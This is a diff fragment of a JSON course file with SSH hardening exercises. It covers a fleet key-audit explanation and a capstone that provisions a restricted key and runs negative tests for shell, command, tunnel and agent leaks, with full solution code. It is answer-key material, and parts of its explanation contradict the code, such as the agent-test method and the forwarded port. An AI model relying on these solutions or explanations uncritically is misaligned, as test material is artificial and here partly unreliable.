+      "solutionExplanationHtml": "<p><strong>Fingerprints are the identity; comments are not.</strong> The comment field is free text that anyone with write access can change, is frequently copied between keys, and is often just <code>user@hostname</code> from a laptop that has since been reimaged. Matching on it produces an inventory that is confidently wrong. The fingerprint is derived from the key material itself, so the same key reports the same fingerprint on every server, under every comment, with or without options in front of it.</p><p><strong>Partial failure must not be total failure.</strong> The <code>if ! remote=$(ssh …)</code> shape converts an unreachable host into a reported line and a continued loop. A fleet audit is most valuable when the fleet is in a bad state, and a script that aborts on the first offline machine is guaranteed to be useless in exactly that situation. Reporting the unreachable count unconditionally — including when it is zero — is the other half of the same idea: <code>MISSING backup-puller</code> is a finding when every host answered, and is meaningless when four did not, so the reader needs both numbers in front of them without having to notice an absent line.</p><p><strong><code>ssh -n</code> is load-bearing, and leaving it out produces the most deceptive bug in this exercise.</strong> The <code>while</code> loop reads the host list on stdin. <code>ssh</code> also reads stdin — that is what makes <code>cmd | ssh host 'cat &gt; file'</code> work in Module 1. Inside the loop those are the same stream, so on the very first iteration <code>ssh</code> consumes every remaining line of the host file. The loop then finds nothing left to read and exits. The script reports no error, exits 0, prints <code>UNREACHABLE 0 host(s)</code>, and has audited exactly one machine out of forty. Nothing in the output hints that anything was skipped. <code>-n</code> redirects ssh's stdin from <code>/dev/null</code> and fixes it; <code>ssh … &lt; /dev/null</code> is equivalent. This is worth remembering as a general rule: any command inside a <code>while read</code> loop that might read stdin needs <code>-n</code> or an explicit redirect.</p><p><strong>Deduplicating per host before counting.</strong> The same key appearing twice in one <code>authorized_keys</code> is common after a few careless <code>ssh-copy-id</code> runs. Counting raw occurrences would report <code>ORPHAN … on 2 host(s)</code> for a key present on one machine, and a count that does not correspond to machines is worse than no count, because remediation is planned from it. Sorting each host's fingerprints with <code>sort -u</code> before adding them to the global tally keeps the number meaning what it says.</p><p><strong>Two ways to lose the exit status, both of which this script hit while being written.</strong> The summary needs to set a flag inside a loop over <code>sort | uniq -c</code>, and the two obvious ways to write that are both wrong in the same direction — the report prints perfectly and the exit status is always 0, so a gate built on it never fires.</p><ul><li><em>The subshell.</em> <code>sort … | while read …</code> runs the loop body in a subshell. <code>orphan_found=1</code> set inside it is discarded when the pipeline ends, and the parent sees the original 0.</li><li><em>SIGPIPE plus <code>pipefail</code>.</em> The usual workaround is <code>… | grep -q x</code> to test whether the loop emitted anything. <code>grep -q</code> exits the moment it finds a match and closes the pipe; the upstream stages then die of SIGPIPE and report failure; with <code>pipefail</code> the whole pipeline's status is therefore non-zero <em>precisely when the match was found</em>. The condition reads exactly backwards.</li></ul><p>Feeding the loop with process substitution — <code>done &lt; &lt;(sort \"$seen\" | uniq -c)</code> — avoids both: the loop body runs in the current shell so the flag survives, and there is no pipe into the loop to break. The same reasoning is why the per-host key loop is fed by a heredoc rather than a pipe.</p>",
+      "referenceUrl": "https://man.openbsd.org/ssh-keygen.1"
+    },
+    {
+      "title": "Provision a Least-Privilege Key and Prove the Limits Hold",
+      "difficulty": "HARD",
+      "estimatedMinutes": 90,
+      "points": 30,
+      "concepts": [
+        "least privilege",
+        "negative testing",
+        "end-to-end provisioning",
+        "composing the module"
+      ],
+      "prerequisites": [
+        "key options",
+        "forced commands",
+        "verifying a login"
+      ],
+      "tags": [
+        "ssh",
+        "security",
+        "capstone",
+        "bash"
+      ],
+      "problemHtml": "<p>The module's capstone. Provisioning a restricted key is easy; the part everyone skips is proving the restrictions actually took effect. A typo in the options string produces a key that works perfectly for its intended job and quietly grants a full shell — and since the intended job succeeds, nothing ever reveals it.</p><p>Write <code>provision-key.sh HOST NAME [VERB]</code> that performs the whole operation and then attacks its own work. <code>VERB</code> is a request the forced command accepts (default <code>status</code>, matching the allowlist wrapper from the previous exercise); the positive test uses it.</p><ol><li>Generate an Ed25519 key at <code>./NAME</code> with no passphrase, refusing to overwrite an existing one.</li><li>Install it on <code>HOST</code> with the options <code>restrict,command=\"/usr/local/bin/NAME-only.sh\"</code>, appending and idempotently.</li><li>Run <strong>one positive test</strong>: connecting with the key must produce the forced command's output. Print <code>POSITIVE ok</code> or <code>POSITIVE failed</code>.</li><li>Run <strong>four negative tests</strong>, each of which must be refused:<ul><li><code>NEG shell</code> — request an interactive terminal with <code>-tt</code>; must fail or report a PTY refusal.</li><li><code>NEG arbitrary</code> — ask to run <code>id</code>; the output must be the forced command's, not <code>id</code>'s.</li><li><code>NEG tunnel</code> — request <code>-L 15432:localhost:5432</code>; the forward must be refused.</li><li><code>NEG agent</code> — request agent forwarding with <code>-A</code>; must not be granted.</li></ul></li><li>Print one line per test as <code>&lt;name&gt; ok</code> when the restriction held or <code>&lt;name&gt; LEAK</code> when it did not.</li><li>Exit <code>0</code> only if the positive test passed <strong>and</strong> all four negative tests held. Any leak exits <code>6</code>.</li></ol><p>A provisioning tool that only runs the positive test tells you the key works. This one tells you the key <em>only</em> works for that, which is the property you were actually trying to create.</p>",
+      "inputSpec": "argv[1] is the SSH destination, which must already be reachable with an existing working credential. argv[2] is a base name used for the key file and the forced-command script path. argv[3] is an optional verb the forced command accepts, defaulting to \"status\".",
+      "outputSpec": "'POSITIVE ok|failed' followed by four lines 'NEG shell|arbitrary|tunnel|agent ok|LEAK', then 'RESULT locked' or 'RESULT leaking'. Exit 0 when fully locked, 6 on any leak, 1 on setup failure.",
+      "constraints": "Every test connection must use BatchMode=yes, IdentitiesOnly=yes and -i with the new key, so nothing else can satisfy the login. A negative test that fails to connect at all counts as 'ok' only when the refusal is the expected one — a network error must not be scored as a passing restriction. The connectivity pre-check must treat only exit status 255 as \"could not connect\" — a well-built wrapper returns a non-zero status for a request it refuses, and that is it working correctly, not a connection failure.",
+      "examplesJson": [
+        {
+          "input": "./provision-key.sh root@160.187.1.208 backup",
+          "output": "POSITIVE ok\nNEG shell ok\nNEG arbitrary ok\nNEG tunnel ok\nNEG agent ok\nRESULT locked",
+          "explanation": "Exit 0. Measured on a real sshd: with restrict in place the server reports 'key options: command' and nothing else, -tt produces 'PTY allocation request failed on channel 0', asking to run id returns the forced command's output, and bytes pushed through the -L forward get nothing back because the server logs 'refused local port forward'."
+        },
+        {
+          "input": "./provision-key.sh root@160.187.1.208 backup   # options written as command=... without restrict",
+          "output": "POSITIVE ok\nNEG shell LEAK\nNEG arbitrary ok\nNEG tunnel LEAK\nNEG agent LEAK\nRESULT leaking",
+          "explanation": "Exit 6, and this is measured output, not a guess. Dropping restrict leaves pty, port-forwarding and agent-forwarding all enabled — the server itself says so: 'key options: agent-forwarding command port-forwarding pty user-rc x11-forwarding'. The forced command still runs perfectly, so the positive test passes and everything looks fine until the negative tests run. The tunnel leak is the dangerous one: it reaches Postgres directly, bypassing the wrapper entirely."
+        },
+        {
+          "input": "./provision-key.sh root@160.187.1.208 backup   # run twice",
+          "output": "POSITIVE ok\nNEG shell ok\nNEG arbitrary ok\nNEG tunnel ok\nNEG agent ok\nRESULT locked",
+          "explanation": "Idempotent: the key already exists locally and the authorized_keys entry is already present, so nothing is regenerated or duplicated, and the full test suite still runs."
+        }
+      ],
+      "hintsJson": [
+        "The tunnel test cannot be done by checking whether the local port opened. With -L, ssh binds the local port immediately whether or not the server agrees, so `nc -z 127.0.0.1 15432` succeeds even when the server logged 'refused local port forward'. Open the forward, then actually read bytes through it — an SSH banner coming back is the only proof the tunnel is live.",
+        "For the arbitrary-command test, do not check the exit status — a forced command returns 0 whatever the client asked for. Compare the output instead: it must be the forced command's output, and must not contain 'uid=' from id.",
+        "For the shell test, capture stderr: the observable signal is the string 'PTY allocation request failed'. Treat a clean interactive shell as a LEAK.",
+        "For the agent test, do not try to read SSH_AUTH_SOCK on the far side — a forced command ignores the command you sent, so you never see that environment. Run with -v and read the server's own report instead: it sends back a line 'Remote: .../authorized_keys:1: key options: ...' listing exactly what is in force, and agent-forwarding appears there only when it is permitted."
+      ],
+      "starterCodeJson": [
+        {
+          "name": "provision-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Cap phat mot khoa quyen-toi-thieu, ROI TU TAN CONG chinh no.\n# Chi chay phep thu THUAN thi ban biet khoa CHAY DUOC.\n# Phai chay ca phep thu NGHICH moi biet khoa CHI chay duoc dung viec do.\nset -uo pipefail\n\nHOST=${1:?usage: provision-key.sh HOST NAME [VERB]}\nNAME=${2:?usage: provision-key.sh HOST NAME [VERB]}\nVERB=${3:-status}   # mot dong tu ma lenh bi ep CHAP NHAN (xem bai truoc)\nPRIV=\"./$NAME\"\nFORCED=\"/usr/local/bin/$NAME-only.sh\"\n\n# TODO 1: sinh khoa Ed25519 khong mat khau, khong ghi de neu da co.\n\n# TODO 2: cai len HOST voi tuy chon:\n#         restrict,command=\"$FORCED\"\n#         Noi them, khong trung lap. Nho chmod 700 / 600.\n\n# TODO 3: kiem KET NOI CO BAN truoc. Khong ket noi duoc thi DUNG LAI —\n#         neu khong, bon phep thu nghich se \"dat\" chi vi mang hong.\n\n# TODO 4: mot phep thu THUAN + bon phep thu NGHICH (shell, arbitrary,\n#         tunnel, agent). Moi cai in \"<ten> ok\" hoac \"<ten> LEAK\".\n\n# TODO 5: RESULT locked -> thoat 0. Co bat ky LEAK nao -> thoat 6.\n"
+        }
+      ],
+      "solutionCodeJson": [
+        {
+          "name": "provision-key.sh",
+          "language": "bash",
+          "code": "#!/usr/bin/env bash\n# Cap phat mot khoa quyen-toi-thieu, ROI TU TAN CONG chinh no.\n# Chi chay phep thu THUAN thi ban biet khoa CHAY DUOC.\n# Phai chay ca phep thu NGHICH moi biet khoa CHI chay duoc dung viec do.\nset -uo pipefail\n\nHOST=${1:?usage: provision-key.sh HOST NAME [VERB]}\nNAME=${2:?usage: provision-key.sh HOST NAME [VERB]}\nVERB=${3:-status}   # mot dong tu ma lenh bi ep CHAP NHAN (xem bai truoc)\nPRIV=\"./$NAME\"\nFORCED=\"/usr/local/bin/$NAME-only.sh\"\n\n# ── 1) Khoa ─────────────────────────────────────────────────────────\nif [ ! -e \"$PRIV\" ]; then\n  ssh-keygen -t ed25519 -C \"$NAME\" -f \"$PRIV\" -N '' -q\nfi\nKEYLINE=$(cat \"$PRIV.pub\")\nB64=$(awk '{print $2}' \"$PRIV.pub\")\n\n# ── 2) Cai dat ──────────────────────────────────────────────────────\n# restrict PHAI co. Chi command= thoi thi cai khoa VAN mo duong ham duoc,\n# tuc la di vong qua chinh cai vo boc vua dung len.\n# LUU Y CU PHAP: than heredoc bat dau ngay o DONG KE TIEP, nen khong duoc\n# viet `|| { ... }` o cuoi dong nay — dau ngoac dong se bi nuot vao than\n# heredoc va bash bao \"unexpected end of file\" o tan cuoi file.\n# Dat phep kiem SAU dau ket thuc heredoc.\nif ssh \"$HOST\" \"OPTS='restrict,command=\\\"$FORCED\\\"' LINE='$KEYLINE' B64='$B64' bash -s\" <<'REMOTE' >/dev/null\n  set -euo pipefail\n  mkdir -p ~/.ssh; chmod 700 ~/.ssh; touch ~/.ssh/authorized_keys\n  grep -qF -- \"$B64\" ~/.ssh/authorized_keys || \\\n    printf '%s %s\\n' \"$OPTS\" \"$LINE\" >> ~/.ssh/authorized_keys\n  chmod 600 ~/.ssh/authorized_keys\nREMOTE\nthen\n  :\nelse\n  echo \"khong cai duoc khoa\" >&2\n  exit 1\nfi\n\n# Ham goi chung: MOI phep thu deu di qua day, nen khong the co chuyen\n# phep thu nay dung tham so khac phep thu kia.\ntry() { ssh -o BatchMode=yes -o IdentitiesOnly=yes -o ConnectTimeout=10 -i \"$PRIV\" \"$@\"; }\n\n# ── 3) Ket noi co ban PHAI chay truoc ───────────────────────────────\n# Neu bo qua buoc nay, mot su co mang se lam ca bon phep thu nghich\n# \"dat\" — ban se bao cao mot cai khoa an toan ma chua he thu gi.\n#\n# Diem tinh te: KHONG duoc lay \"ma thoat khac 0\" lam dau hieu that bai o\n# day. Mot cai vo boc tot se TU CHOI yeu cau rong (thoat 77), va do la\n# no dang lam DUNG viec cua no. Chi rieng 255 moi co nghia \"chua bao gio\n# ket noi duoc\" — dung phan biet cua Module 1.\ntry \"$HOST\" \"$VERB\" </dev/null >/dev/null 2>&1\nrc=$?\nif [ \"$rc\" -eq 255 ]; then\n  echo \"ABORT khong ket noi duoc bang khoa moi — chua kiem duoc gi\" >&2\n  exit 1\nfi\n\nleak=0\nmark() { if [ \"$2\" = ok ]; then echo \"$1 ok\"; else echo \"$1 LEAK\"; leak=1; fi; }\n\n# ── 4a) Phep thu THUAN ──────────────────────────────────────────────\n# Lenh bi ep phai chay va in ra thu gi do cho mot dong tu duoc phep.\nout=$(try \"$HOST\" \"$VERB\" </dev/null 2>/dev/null)\ncase \"$out\" in\n  ?*) echo \"POSITIVE ok\" ;;\n  *)  echo \"POSITIVE failed\"; leak=1 ;;\nesac\n\n# ── 4b) NGHICH: xin mot shell tuong tac ─────────────────────────────\n# Dau hieu quan sat duoc la dong \"PTY allocation request failed\".\nshell_out=$(try -tt \"$HOST\" </dev/null 2>&1)\ncase \"$shell_out\" in\n  *\"PTY allocation request failed\"*) mark \"NEG shell\" ok ;;\n  *) mark \"NEG shell\" leak ;;\nesac\n\n# ── 4c) NGHICH: xin chay lenh khac ──────────────────────────────────\n# KHONG duoc xet ma thoat: lenh bi ep tra ve 0 du client xin gi di nua.\n# Phai xet NOI DUNG: neu thay \"uid=\" tuc la `id` da that su chay.\narb_out=$(try \"$HOST\" id </dev/null 2>/dev/null)\ncase \"$arb_out\" in\n  *uid=*) mark \"NEG arbitrary\" leak ;;\n  *)      mark \"NEG arbitrary\" ok ;;\nesac\n\n# ── 4d) NGHICH: mo duong ham ────────────────────────────────────────\n# CAI BAY LON NHAT CUA CA BAI: voi -L, ssh bind cong o MAY MINH NGAY LAP\n# TUC, truoc va doc lap voi viec may chu co dong y hay khong. Nen:\n#   - `nc -z 127.0.0.1 15432` LUON thanh cong, ke ca khi duong ham chet;\n#   - `ExitOnForwardFailure=yes` cung khong cuu duoc, vi voi -L su tu choi\n#     chi xay ra luc CO LUU LUONG di qua, chu khong luc thiet lap.\n# Log may chu luc do ghi \"refused local port forward\" — nhung phia client\n# thi moi thu trong nhu da mo. Phep thu duy nhat dung la GUI THU GI DO\n# qua ong roi xem co byte nao tro ve khong.\ntunnel_leak=0\nif try -o ExitOnForwardFailure=yes -L 15432:127.0.0.1:22 -N -f \"$HOST\" </dev/null 2>/dev/null; then\n  sleep 1\n  banner=\"\"\n  if { exec 9<>/dev/tcp/127.0.0.1/15432; } 2>/dev/null; then\n    IFS= read -r -t 3 banner <&9 || banner=\"\"\n    exec 9<&-; exec 9>&-\n  fi\n  pkill -f \"15432:127.0.0.1:22\" 2>/dev/null || true\n  # Co byte SSH tro ve => duong ham that su thong => rang buoc da thung.\n  case \"$banner\" in SSH-*) tunnel_leak=1 ;; esac\nfi\nif [ \"$tunnel_leak\" -eq 1 ]; then mark \"NEG tunnel\" leak; else mark \"NEG tunnel\" ok; fi\n\n# ── 4e) NGHICH: chuyen tiep agent ───────────────────────────────────\n# Doc thang LOI KHAI CUA MAY CHU. Voi -v, client in lai nguyen van dong\n# may chu gui sang, liet ke cac tuy chon dang co hieu luc cho khoa nay:\n#\n#   Co restrict:    Remote: ...authorized_keys:1: key options: command\n#   Khong restrict: Remote: ...authorized_keys:1: key options: agent-forwarding\n#                   command port-forwarding pty user-rc x11-forwarding\n#\n# Cach nay tot hon hai cach gian tiep thuong thay: do SSH_AUTH_SOCK o may\n# xa thi bi chinh lenh bi ep che mat (no bo qua lenh ban gui), con doan\n# theo ma thoat thi khong phan biet duoc \"bi tu choi\" voi \"chay xong\".\n# Day la may chu tu noi ra, va no bao luon ca pty lan port-forwarding.\noptline=$(try -v -A \"$HOST\" \"$VERB\" </dev/null 2>&1 | grep -m1 'key options:')\ncase \"$optline\" in\n  *agent-forwarding*) mark \"NEG agent\" leak ;;\n  *)                  mark \"NEG agent\" ok ;;\nesac\n\n# ── 5) Ket luan ─────────────────────────────────────────────────────\nif [ \"$leak\" -eq 0 ]; then\n  echo \"RESULT locked\"\n  exit 0\nfi\necho \"RESULT leaking\"\nexit 6\n"
+        }
+      ],
+      "solutionExplanationHtml": "<p><strong>Negative tests are the deliverable.</strong> The positive test confirms the key works, which is what a provisioning script normally checks and is exactly the thing that would still be true if the restrictions were silently absent. Writing <code>command=\"…\"</code> without <code>restrict</code> — a plausible typo, and the configuration many tutorials show — produces a key whose forced command runs perfectly and which can still open <code>-L 5432:localhost:5432</code> straight to Postgres, bypassing the wrapper it was built around. Only an attempt to do the forbidden thing surfaces that.</p><p><strong>Three of the four negative tests need a specific technique, because the naive version scores a leak as a pass.</strong></p><ul><li><em>Arbitrary command:</em> exit status is useless. A forced command returns its own status regardless of what the client requested, so <code>try \"$HOST\" id</code> exits 0 whether <code>id</code> ran or not. The test has to inspect the output and look for <code>uid=</code>, which appears only if <code>id</code> genuinely executed.</li><li><em>Tunnel:</em> this one is the trap that catches almost everyone, and it fails in the <em>safe-looking</em> direction. With <code>-L</code>, ssh binds the local port on your own machine immediately, independently of whether the server agrees to the forward. So <code>nc -z 127.0.0.1 15432</code> reports success, and a test built on that reports LEAK for a properly restricted key. <code>ExitOnForwardFailure=yes</code> does not rescue it either: for a local forward the refusal happens when traffic arrives, not at setup, so ssh still exits 0. Meanwhile the server log says exactly what happened — <code>refused local port forward: originator 127.0.0.1 port 64772, target localhost port 22</code>. The only honest client-side test is to push bytes through the forward and see whether anything comes back.</li><li><em>Agent:</em> asking whether <code>-A</code> &quot;worked&quot; has no direct answer, so the test observes the consequence — whether <code>SSH_AUTH_SOCK</code> is set to a real path in the remote environment. A restricted key leaves it empty.</li></ul><p><strong>The connectivity pre-check prevents the worst possible outcome for a security tool: a false all-clear.</strong> If the host is unreachable, every negative test fails to connect, every failure looks like a refusal, and the script prints four <code>ok</code> lines and <code>RESULT locked</code> for a key it never tested. Establishing that a basic connection succeeds first means each subsequent failure can be attributed to the restriction rather than to the network. This is the same principle as Module 1's connection doctor and as this track's recurring rule — verify the checker before you trust what it reports.</p><p>Routing every connection through one <code>try()</code> helper is what keeps the tests comparable. Five hand-written <code>ssh</code> invocations drift apart, and once the positive test and the negative tests are not using the same identity settings, the comparison between them stops meaning anything.</p>",
+      "diagramMermaid": "flowchart TD\n  A[Sinh khoa] --> B[Cai voi restrict va command=]\n  B --> C{Ket noi co ban co chay khong}\n  C -->|Khong| D[ABORT chua kiem duoc gi]\n  C -->|Co| E[Phep thu THUAN lenh bi ep co chay khong]\n  E --> F[NGHICH xin shell]\n  F --> G[NGHICH xin chay lenh khac]\n  G --> H[NGHICH mo duong ham]\n  H --> I[NGHICH chuyen tiep agent]\n  I --> J{Co bat ky LEAK nao khong}\n  J -->|Khong| K[RESULT locked thoat 0]\n  J -->|Co| L[RESULT leaking thoat 6]",
+      "referenceUrl": "https://man.openbsd.org/ssh.1"
+    }
+  ]
+}
